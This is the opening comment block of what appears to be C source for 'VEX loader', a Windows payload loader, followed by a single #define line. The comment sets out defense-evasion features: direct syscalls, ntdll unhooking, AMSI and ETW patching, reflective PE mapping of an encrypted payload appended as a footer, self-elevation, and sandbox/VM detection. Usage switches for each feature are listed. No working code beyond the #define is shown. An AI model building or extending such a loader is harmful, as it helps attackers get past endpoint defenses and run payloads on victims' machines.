// VEX loader — direct syscalls, ntdll unhook, AMSI/ETW patch,
// reflective PE map. Payload is read from the footer appended by
// tools/pack.py (magic "VXPAY003", AES-256-GCM sealed, HMAC-signed), or from
// --file. Legacy XOR footers (VXPAY002) are rejected unless the loader is
// built with VEX_ALLOW_LEGACY_STAGE=1.
//
//   xloader.exe                    run appended payload
//   xloader.exe --file p.exe       map a payload from disk (testing)
//   xloader.exe --inspect          parse + print payload info, do not run
//   xloader.exe --no-amsi          skip AMSI patch
//   xloader.exe --no-etw           skip ETW patch
//   xloader.exe --no-unhook        skip ntdll restore
//   xloader.exe --no-elevate       do not self-elevate
//   xloader.exe --vm-check         abort when a VM/sandbox is detected
//   xloader.exe -v                 verbose
#define WIN32_LEAN_AND_MEAN
